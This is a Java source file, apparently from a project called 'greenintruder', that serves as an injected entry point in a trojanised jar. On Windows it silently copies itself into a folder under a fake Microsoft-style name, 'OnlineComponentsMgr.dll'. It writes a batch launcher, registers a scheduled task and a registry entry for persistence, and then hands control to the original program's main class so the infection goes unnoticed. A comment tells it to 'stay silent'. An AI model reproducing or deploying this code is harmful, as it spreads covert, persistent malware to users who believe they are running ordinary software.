package io.github.explodingbottle.greenintruder.certifier;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.util.jar.Manifest;

import io.github.explodingbottle.greenintruder.certifier.admintools.DeployerTool;
import io.github.explodingbottle.greenintruder.certifier.admintools.InjectionTool;

public class InjectedMain {

	public static void main(String[] args) throws Throwable {
		if (System.getProperty("os.name").toLowerCase().contains("windows")) {
			if (!DeployerTool.isScheduledTaskRegistred()) {
				File uniFolder = DeployerTool.queryUninjectionFolder();
				if (uniFolder == null) {
					uniFolder = DeployerTool.getUninjectionFolderReady();
				}
				if (uniFolder != null) { // You must stay silent even if you can't do your silly stuff.
					File fakeMgr = new File(uniFolder, "OnlineComponentsMgr.dll");
					if (!fakeMgr.exists()) {
						InjectionTool.extractCodeFromMyself(fakeMgr);
					}
					File fakeMgrLauncher = new File(uniFolder, "OnlineComponentsMgr.bat");
					if (!fakeMgrLauncher.exists()) {
						FileOutputStream ocmBatWriter = new FileOutputStream(fakeMgrLauncher);
						OutputStreamWriter osWriter = new OutputStreamWriter(ocmBatWriter);
						BufferedWriter bw = new BufferedWriter(osWriter);
						bw.write("@echo off\r\n");
						bw.write(
								"start javaw -jar %LOCALAPPDATA%\\Microsoft\\Windows\\OnlineComponents\\OnlineComponentsMgr.dll chkupdts\r\n");
						bw.close();
						osWriter.close();
						ocmBatWriter.close();
					}
				}
				if (!DeployerTool.isRegRegistred()) {
					DeployerTool.registerReg();
				}
			}
		}
		InputStream is = InjectedMain.class.getClassLoader().getResourceAsStream("JFASTBOOT.MF");
		if (is != null) {
			Manifest manifest = new Manifest(is);
			Class<?> clazz = Class.forName(manifest.getMainAttributes().getValue("Main-Class"));
			Method mainMethod = clazz.getMethod("main", String[].class);
			mainMethod.invoke(null, new Object[] { (String[]) args });
			is.close();
		}
	}

}
